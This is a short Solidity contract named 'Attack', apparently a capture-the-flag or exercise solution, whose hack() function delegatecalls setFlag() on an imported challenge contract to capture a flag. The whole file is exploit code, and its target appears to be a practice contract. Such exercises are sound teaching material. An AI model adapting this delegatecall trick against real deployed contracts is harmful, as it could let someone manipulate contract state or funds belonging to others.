// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'hardhat/console.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import './Challenge.sol';

contract Attack {
    bool public flag;

    function hack(address challenge) public {
        (bool success, bytes memory result) = challenge.delegatecall(abi.encodeWithSignature("setFlag()"));
        console.log(string(result));
        if (!success) {
            revert("gg");
        }
    }
}
